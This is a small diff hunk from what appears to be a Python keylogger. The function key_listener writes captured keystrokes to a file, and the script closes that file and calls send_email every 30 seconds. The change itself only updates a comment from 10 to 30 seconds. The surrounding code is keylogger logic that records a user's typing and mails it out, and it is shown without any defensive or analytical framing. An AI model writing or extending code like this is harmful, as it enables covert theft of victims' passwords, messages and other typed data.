@@ -59,7 +59,7 @@ def key_listener():
         else:
             f.write(key.replace("'", ""))
 
-#EVERY 10 SECONDS CLOSE THE FILE AND CALL THE FUNCTION SEND_EMAIL
+#EVERY 30 SECONDS CLOSE THE FILE AND CALL THE FUNCTION SEND_EMAIL
         if time.time()-time0 > 30:
             f.close()
             send_email()
